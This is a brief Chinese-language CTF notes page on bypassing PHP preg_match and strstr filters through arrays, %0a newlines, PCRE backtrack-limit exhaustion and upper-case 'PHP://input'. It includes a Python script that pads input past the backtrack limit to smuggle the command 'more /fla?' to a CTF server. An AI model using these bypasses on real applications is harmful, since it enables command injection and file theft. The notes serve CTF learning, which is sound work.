## 数组绕过

当传入数组时，preg_match函数将会返回false

##  \\ n和 %0a 绕过

正则中的 **.** 不会匹配换行符，而在非多行模式下，`$`似乎会忽略在句尾的`%0a`

```
str=\nflag

str=flag%0a
```

## 回溯法绕过

总结一下就是利用通配符**`.* .+`**可以匹配任何字符的能吞吐的最大数量，PHP为了防止正则表达式的拒绝服务攻击，给pcre设定了一个回溯次数上限，我们按照最大的限制一百万条即可

[PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

```
import requests
url="http://ctf.qwq.cc:11683/"
a='a'*1000010

data={"target":"but how"+a,
      "code":"more /fla?"}
req=requests.post(url,data=data)
print(req.text)

数组绕过
```

## 大小写绕过

当没标出忽略大小写绕过时，可以尝试大小写绕过

**`strstr()`**

因为strstr()函数对大小写敏感，也就是字符串中必须要出现"php://"之类才会生效，page=PHP://input之类的大写的字母是就可以绕过strstr()函数

